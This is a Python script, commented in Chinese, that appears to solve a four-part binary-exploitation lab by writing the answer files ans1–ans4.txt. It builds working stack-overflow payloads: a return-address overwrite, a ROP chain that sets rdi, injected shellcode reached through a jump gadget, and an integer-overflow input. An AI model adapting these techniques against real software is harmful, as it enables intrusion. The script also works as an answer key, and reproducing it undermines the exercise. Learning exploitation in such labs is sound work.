import struct
import os

# 辅助函数：把数字打包成64位小端序字节流
# 这样不用每次都手动写 b'\x...'
def p64(addr):
    return struct.pack('<Q', addr)

def solve_prob1():
    print("正在生成 ans1.txt...")
    # Problem 1: 简单的栈溢出覆盖返回地址
    # 用 objdump -d problem1 看了下 func 函数
    # subq $0x20, %rsp
    # lea -0x8(%rbp), %rax -> strcpy 的目标地址
    # 所以 buffer 从 rbp-8 开始。
    # 栈结构: [ Buffer (8) ] [ Saved RBP (8) ] [ Return Addr ]
    # 只需要填充 8 + 8 = 16 字节就可以碰到返回地址了
    
    # 目标函数 func1 地址: 0000000000401216 <func1>
    target_addr = 0x401216
    
    # A用来填充buffer, B用来填充saved rbp
    payload = b'A' * 8 + b'B' * 8 + p64(target_addr)
    
    with open('ans1.txt', 'wb') as f:
        f.write(payload)
    print("完成! 运行 ./problem1 ans1.txt 测试")

def solve_prob2():
    print("正在生成 ans2.txt...")
    # Problem 2: 开启了 NX 保护，不能直接执行栈上的代码
    # 需要利用 ROP (Return Oriented Programming)
    # func2 (地址 0x401216) 会检查 arg1 (edi) 是否等于 0x3f8 (1016)
    # 既然是 64位调用，参数1放在 rdi 寄存器
    
    # 寻找 gadget: pop rdi; ret
    # 在 problem2.asm 里搜到了: 4012bb: 5f pop %rdi; c3 retq (实际上 objdump 显示 pop_rdi 函数在 0x4012bb)
    
    pop_rdi_ret = 0x4012bb 
    target_func = 0x401216
    arg_value = 0x3f8
    
    # func 的栈结构和 problem1 一样 (rbp-8)
    # Padding: 8 byte buf + 8 byte saved rbp = 16 bytes
    
    payload = b'A' * 16
    payload += p64(pop_rdi_ret)
    payload += p64(arg_value)
    payload += p64(target_func)
    
    with open('ans2.txt', 'wb') as f:
        f.write(payload)
    print("完成! 运行 ./problem2 ans2.txt 测试")

def solve_prob3():
    print("正在生成 ans3.txt...")
    # Problem 3: 没有 NX，但开启了 ASLR
    # 观察代码 func:
    # subq $0x30, %rsp
    # 并把 %rsp 保存到了 saved_rsp (0x403510) 全局变量里
    # buffer 在 rbp-0x20，且允许写入 0x40 字节 (strncpy)
    # 这意味着我们可以写满 0x20 字节 buffer，可以覆盖 saved rbp，然后覆盖 ret addr
    # 溢出空间: 64 - 32 - 8 = 24 字节给后面的 ROP/Return chain
    
    # 我们有一个很棒的 gadget: jmp_xs (0x401334)
    # 它会取出 saved_rsp，加 0x10，然后跳转过去。
    # saved_rsp 是 sub $0x30 之后的 rsp。
    # saved_rsp + 0x10 = (rbp-0x30) + 0x10 = rbp-0x20
    # 也就是 Buffer 的起始地址！
    # 所以这是一个这就相当于 jmp to buffer
    
    # 任务要求: 输出 '114' (0x72)
    # Shellcode 逻辑:
    # mov rdi, 0x72
    # mov rax, 0x401216
    # call rax
    
    shellcode =  b'\x48\xc7\xc7\x72\x00\x00\x00' # mov rdi, 0x72
    shellcode += b'\x48\xc7\xc0\x16\x12\x40\x00' # mov rax, 0x401216
    shellcode += b'\xff\xd0'                     # call rax
    
    # buffer 长度 32 字节
    # 需要把 shellcode 放在 buffer 开头，剩下的用 NOP 填充，直到覆盖到 return address
    if len(shellcode) > 32:
        print("Error: Shellcode too long!")
        return
        
    padding_len = 32 - len(shellcode)
    # 填充 saved rbp (8 bytes)
    # 最后覆盖 ret addr 为 jmp_xs 的地址
    
    jmp_xs = 0x401334
    
    payload = shellcode + (b'\x90' * padding_len) + (b'B' * 8) + p64(jmp_xs)
    
    with open('ans3.txt', 'wb') as f:
        f.write(payload)
    print("完成! 运行 ./problem3 ans3.txt 测试")

def solve_prob4():
    print("正在生成 ans4.txt...")
    # Problem 4: 这是一个整型溢出 + 逻辑绕过的问题
    # 题目有 Canary 保护，所以不能做栈溢出
    # func 里面有一个循环递减检查
    # 如果 arg = -1 (0xFFFFFFFF)
    # 它会通过初始检查，然后进入一个巨大的循环 (大概 42亿次)
    # 最后满足条件调用 func1 拿到 flag
    # 现在的 CPU 跑 40亿次空循环大概几秒钟。完全可以接受。
    
    with open('ans4.txt', 'w') as f:
        f.write("-1")
    print("完成! 运行 ./problem4 ans4.txt (可能需要等几秒)")

if __name__ == "__main__":
    solve_prob1()
    solve_prob2()
    solve_prob3()
    solve_prob4()
